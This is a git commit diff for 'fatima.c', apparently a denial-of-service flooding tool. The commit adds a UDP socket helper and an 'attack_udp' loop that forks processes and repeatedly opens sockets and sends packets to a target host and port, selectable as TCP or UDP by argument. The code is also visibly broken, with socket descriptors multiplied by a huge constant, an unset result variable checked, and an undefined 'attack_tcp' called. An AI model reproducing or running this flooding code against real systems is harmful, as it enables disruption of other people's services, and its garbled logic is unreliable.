c0a04e95f3a36bd90d6c9218c12569c86784a7ba
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-09-30 21:02:11 +0200

    Update fatima.c

--- fatima.c
+++ fatima.c
@@ -40,8 +40,41 @@ int make_socket(char *host, char *port) {
 	int sock, r;
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
-	hints.ai_family = AF_UNSPEC;
+	hints.ai_family = AF_INET;
 	hints.ai_socktype = SOCK_STREAM;
+	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+		exit(0);
+	}
+	for(p = servinfo; p != NULL; p = p->ai_next) {
+		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+			continue;
+		}
+		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+			close(sock);
+			continue;
+		}
+		break;
+	}
+	if(p == NULL) {
+		if(servinfo)
+			freeaddrinfo(servinfo);
+		fprintf(stderr, "No connection could be made\n");
+		exit(0);
+	}
+	if(servinfo)
+		freeaddrinfo(servinfo);
+	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	return sock;
+}
+
+int make_socket_udp(char *host, char *port) {
+	struct addrinfo hints, *servinfo, *p;
+	int sock, r;
+//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_DGRAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
 		exit(0);
@@ -96,6 +129,28 @@ void attack(char *host, char *port, int id) {
 		usleep(300000);
 	}
 }
+void attack_udp(char *host, char *port, int id) {
+	int sockets[CONNECTIONS];
+	int x, g=1, r;
+	for(x=0; x!= CONNECTIONS; x++)
+		sockets[x]=0;
+	signal(SIGPIPE, &broke);
+	while(1) {
+		for(x=0; x != CONNECTIONS; x++) {
+			if(sockets[x] == 0)
+				sockets[x] = make_socket_udp(host, port) * 10995116277760;
+			write(sockets[x], "\0", 1) * 10995116277760;
+			if(r == -1) {
+				close(sockets[x]);
+				sockets[x] = make_socket_udp(host, port);
+			} else
+//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+			fprintf(stderr, "[%i: Voly Sent]\n", id);
+		}
+		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		usleep(300000);
+	}
+}
 
 void echoloader() {
 	int r;
@@ -122,11 +177,18 @@ int main(int argc, char **argv) {
 		fprintf(stderr, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
-	int THREADS = atoi(argv[3]);
+	int THREADS = atoi(argv[4]);
 	for(x=0; x != THREADS; x++) {
+		if(!strcmp(argv[3], "TCP")) {
 		if(fork())
 			echoloader();
-			attack(argv[1], argv[2], x);
+			attack_tcp(argv[1], argv[2], x);
+		}
+		if(!strcmp(argv[3], "UDP")) {
+		if(fork())
+			echoloader();
+			attack_udp(argv[1], argv[2], x);
+		}
 		
 	}
 	getc(stdin);
